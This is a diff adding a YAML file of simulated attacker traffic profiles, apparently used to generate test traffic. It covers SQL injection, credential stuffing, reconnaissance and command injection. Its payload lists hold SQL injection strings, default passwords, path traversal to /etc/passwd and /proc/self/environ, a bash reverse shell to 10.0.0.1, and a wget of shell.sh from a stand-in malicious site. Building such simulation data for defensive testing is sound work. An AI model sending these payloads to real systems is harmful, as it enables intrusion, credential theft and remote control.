@@ -1,0 +1,78 @@
+profiles:
+  - name: sql_injection_bursty
+    actor_type: attacker_sqli
+    user_agents:
+      - "sqlmap/1.7"
+      - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    payloads:
+      - "admin' OR 1=1 --"
+      - "' UNION SELECT username,password FROM users --"
+      - "'; DROP TABLE users; --"
+      - "benchmark(1000000,MD5(1))"
+    min_interval_ms: 120
+    max_interval_ms: 600
+    burst_size_min: 2
+    burst_size_max: 7
+    idle_between_bursts_min: 8
+    idle_between_bursts_max: 28
+    solo_burst_chance: 0.35
+    weight: 2
+
+  - name: credential_stuffing_fast
+    actor_type: attacker_creds
+    user_agents:
+      - "python-requests/2.31"
+      - "HeadlessChrome/119.0"
+      - "AttackBot/2.0"
+    payloads:
+      - "username=admin&password=admin"
+      - "username=root&password=toor"
+      - "username=test&password=welcome1"
+      - "username=guest&password=guest"
+    min_interval_ms: 80
+    max_interval_ms: 280
+    burst_size_min: 2
+    burst_size_max: 8
+    idle_between_bursts_min: 10
+    idle_between_bursts_max: 32
+    solo_burst_chance: 0.3
+    weight: 2
+
+  - name: low_and_slow_recon
+    actor_type: attacker_recon
+    user_agents:
+      - "Mozilla/5.0 (compatible; ReconCrawler/1.0)"
+      - "curl/8.4.0"
+    payloads:
+      - "../../etc/passwd"
+      - "../..\\windows\\system32\\drivers\\etc\\hosts"
+      - "/proc/self/environ"
+      - "GET /admin/config"
+    min_interval_ms: 1800
+    max_interval_ms: 4200
+    burst_size_min: 1
+    burst_size_max: 3
+    idle_between_bursts_min: 20
+    idle_between_bursts_max: 55
+    solo_burst_chance: 0.5
+    weight: 1
+
+  - name: cmd_injection_opportunistic
+    actor_type: attacker_cmdi
+    user_agents:
+      - "Mozilla/5.0"
+      - "Wget/1.21.4"
+      - "MaliciousBot/1.0"
+    payloads:
+      - "$(whoami)"
+      - "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
+      - "wget http://malicious-site.com/shell.sh"
+      - "id; uname -a"
+    min_interval_ms: 200
+    max_interval_ms: 1200
+    burst_size_min: 1
+    burst_size_max: 5
+    idle_between_bursts_min: 12
+    idle_between_bursts_max: 36
+    solo_burst_chance: 0.4
+    weight: 1
